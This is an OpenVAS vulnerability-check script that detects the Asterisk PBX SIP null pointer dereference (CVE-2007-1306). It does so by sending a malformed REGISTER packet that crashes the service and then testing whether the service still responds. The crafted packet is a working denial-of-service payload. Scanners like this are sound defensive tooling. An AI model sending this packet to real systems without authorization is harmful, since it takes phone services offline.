# OpenVAS Vulnerability Test
# $Id: asterisk_null_pointer_dereference.nasl 16 2013-10-27 13:09:52Z jan $
# Description: Asterisk PBX NULL Pointer Dereference Overflow
#
# Authors:
# Ferdy Riphagen 
#
# Copyright:
# Copyright (C) 2007 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The host contains an service that is prone to a remote buffer overflow.

Description :

The remote host appears to be runnning Asterisk PBX, an open-source
telephone system. 

The application suffers from a null pointer dereference overflow in
the SIP service. When sending an mailformed SIP packet with no URI and 
version in the request an attacker can trigger a Denial of Service and 
shutdown the application resulting in a loss of availability.";

tag_solution = "Upgrade to Asterisk PBX release 1.4.1 or 1.2.16.";

# Note:
# Because of many systems using safe_asterisk to watchdog 
# the asterisk running process, this check could be 
# false negative prone.

if (description) {
 script_id(9999991);
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_cve_id("CVE-2007-1306");
 script_bugtraq_id(22838);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");

 name = "Asterisk PBX NULL Pointer Dereference Overflow";
 script_name(name);
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 summary = "Detect a null pointer dereference overflow in Asterisk PBX";
 script_summary(summary);
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2007 Ferdy Riphagen");
 
 script_dependencies("sip_detection.nasl");
 script_require_keys("Services/udp/sip");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://labs.musecurity.com/advisories/MU-200703-01.txt");
 script_xref(name : "URL" , value : "http://asterisk.org/node/48320");
 script_xref(name : "URL" , value : "http://asterisk.org/node/48319");
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/228032");
 exit(0);
}

function get_sip_banner(port) {
    local_var soc, r, opt,  banner;
    global_var port;

    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
    if (!soc) return NULL;

    opt = string(
        "OPTIONS sip:user@", get_host_name(), " SIP/2.0", "\r\n",
        "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
        "To: User <sip:user", get_host_name(), ":", port, ">\r\n",
        "From: OpenVAS <sip:openvas@", this_host(), ":", port, ">\r\n",
        "Call-ID: ", rand(), "\r\n",
        "CSeq: ", rand(), " OPTIONS\r\n",
        "Contact: OpenVAS <sip:openvas@", this_host(), ">\r\n",
        "Max-Forwards: 10\r\n",
	"Accept: application/sdp\r\n",
        "Content-Length: 0\r\n\r\n");

    send(socket:soc, data:opt);
    r = recv(socket:soc, length:1024);
    if ("SIP/2.0" >< r && ("Server:" >< r)) {
        banner = egrep(pattern:'^Server:', string:r);
        banner = substr(banner, 8);
    }
    
    else if ("SIP/2.0" >< r && ("User-Agent" >< r)) {
        banner = egrep(pattern:'^User-Agent', string:r);
        banner = substr(banner, 12);
    }
    
    if (!isnull(banner)) return banner;
    return NULL;
}

function sip_send_recv(port, data) {
    local_var r, soc;
    global_var port, data;

    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
    if (!soc) return NULL;

    send(socket:soc, data:data);
    r = recv(socket:soc, length:1024);
    if (!isnull(r)) return r;
    return NULL;
}

port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;

option = string(
    "OPTIONS sip:user@", get_host_name(), " SIP/2.0", "\r\n",
    "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
    "To: User <sip:user@", get_host_name(), ":", port, ">\r\n",
    "From: OpenVAS <sip:openvas@", this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " OPTIONS\r\n",
    "Contact: OpenVAS <sip:openvas@", this_host(), ">\r\n",
    "Max-Forwards: 10\r\n",
    "Accept: application/sdp\r\n",
    "Content-Length: 0\r\n\r\n");

bad_register = string(
    "REGISTER\r\n",
    "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
    "To: User <sip:user@", get_host_name(), ":", port, ">\r\n",
    "From: OpenVAS <sip:openvas@", this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " OPTIONS\r\n",
    "Contact: OpenVAS <sip:openvas@", this_host(), ">\r\n",
    "Max-Forwards: 0\r\n",
    "Accept: application/sdp\r\n",
    "Content-Length: 0\r\n\r\n");

banner = get_sip_banner(port:port);
if ("Asterisk PBX" >!< banner) exit(0);

exp = sip_send_recv(port:port, data:bad_register);
if (isnull(exp)) {
    res = sip_send_recv(port:port, data:option);
    if (isnull(res)) {
        security_hole(port);
        exit(0);
    }
}
